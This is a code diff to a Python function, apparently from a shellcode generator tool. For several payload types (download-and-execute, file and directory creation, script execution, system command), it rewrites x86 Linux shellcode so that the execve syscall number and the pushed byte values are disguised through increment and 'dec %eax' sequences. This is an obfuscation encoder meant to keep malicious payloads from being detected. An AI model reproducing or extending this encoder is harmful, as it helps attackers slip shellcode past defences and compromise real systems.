@@ -85,19 +85,95 @@ def start(type,shellcode,job):
 				middle = middle.replace(l,command)
 		shellcode = start + middle + end
 	if 'dir_create(' in job:
-		shellcode = 'N' + shellcode
+		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
+		t = True
+		eax = str('0xb')
+		eax_2 = "%x" % (int(eax, 16) + int('01', 16))
+		eax_add = 'push $0x%s\npop %%eax\ndec %%eax\n'%(eax_2)
+		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')	
+		for line in shellcode.rsplit('\n'):
+			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
+				data = line.rsplit('push')[1].rsplit('$0x')[1]
+				ebx_2 = "%x" % (int(data, 16) + int('01', 16))
+				command = '\npush $0x%s\npop %%eax\ndec %%eax\npush %%eax\n'%(str(ebx_2))
+				shellcode = shellcode.replace(line,command)
 	if 'download_execute(' in job:
-		shellcode = 'N' + shellcode
+		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
+		t = True
+		eax = str('0xb')
+		eax_2 = "%x" % (int(eax, 16) + int('01', 16))
+		eax_add = 'push $0x%s\npop %%eax\ndec %%eax\n'%(eax_2)
+		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')	
+		for line in shellcode.rsplit('\n'):
+			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
+				data = line.rsplit('push')[1].rsplit('$0x')[1]
+				ebx_2 = "%x" % (int(data, 16) + int('01', 16))
+				command = '\npush $0x%s\npop %%eax\ndec %%eax\npush %%eax\n'%(str(ebx_2))
+				shellcode = shellcode.replace(line,command)
 	if 'download(' in job:
-		shellcode = 'N' + shellcode
+		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
+		t = True
+		eax = str('0xb')
+		eax_2 = "%x" % (int(eax, 16) + int('01', 16))
+		eax_add = 'push $0x%s\npop %%eax\ndec %%eax\n'%(eax_2)
+		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')	
+		for line in shellcode.rsplit('\n'):
+			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
+				data = line.rsplit('push')[1].rsplit('$0x')[1]
+				ebx_2 = "%x" % (int(data, 16) + int('01', 16))
+				command = '\npush $0x%s\npop %%eax\ndec %%eax\npush %%eax\n'%(str(ebx_2))
+				shellcode = shellcode.replace(line,command)
 	if 'exec(' in job:
 		shellcode = 'N' + shellcode
 	if 'file_create(' in job:
-		shellcode = 'N' + shellcode
+		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
+		t = True
+		eax = str('0xb')
+		eax_2 = "%x" % (int(eax, 16) + int('01', 16))
+		eax_add = 'push $0x%s\npop %%eax\ndec %%eax\n'%(eax_2)
+		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')	
+		for line in shellcode.rsplit('\n'):
+			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
+				data = line.rsplit('push')[1].rsplit('$0x')[1]
+				ebx_2 = "%x" % (int(data, 16) + int('01', 16))
+				command = '\npush $0x%s\npop %%eax\ndec %%eax\npush %%eax\n'%(str(ebx_2))
+				shellcode = shellcode.replace(line,command)
 	if 'script_executor(' in job:
-		shellcode = 'N' + shellcode
+		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
+		t = True
+		eax = str('0xb')
+		eax_2 = "%x" % (int(eax, 16) + int('01', 16))
+		eax_add = 'push $0x%s\npop %%eax\ndec %%eax\n'%(eax_2)
+		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')	
+		for line in shellcode.rsplit('\n'):
+			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
+				data = line.rsplit('push')[1].rsplit('$0x')[1]
+				ebx_2 = "%x" % (int(data, 16) + int('01', 16))
+				command = '\npush $0x%s\npop %%eax\ndec %%eax\npush %%eax\n'%(str(ebx_2))
+				shellcode = shellcode.replace(line,command)
 	if 'system(' in job:
-		shellcode = 'N' + shellcode
+		times = int(type.rsplit('dec_')[1])
+		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
+		t = True
+		eax_2 = str('0xb')
+		n = 0
+		while n<times:
+			eax_2 = "%x" % (int(eax_2, 16) + int('01', 16))
+			n+= 1
+			print n
+		dec = 'dec %eax\n' * n
+		eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,dec)
+		shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
+		for line in shellcode.rsplit('\n'):
+			if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
+				ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
+				n = 0
+				while n<times:
+					ebx_2 = "%x" % (int(ebx_2, 16) + int('01', 16))
+					n+= 1
+				dec = 'dec %eax\n' * n
+				command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(dec))
+				shellcode = shellcode.replace(line,command)
 	if 'write(' in job:
 		shellcode = 'N' + shellcode
 	return shellcode
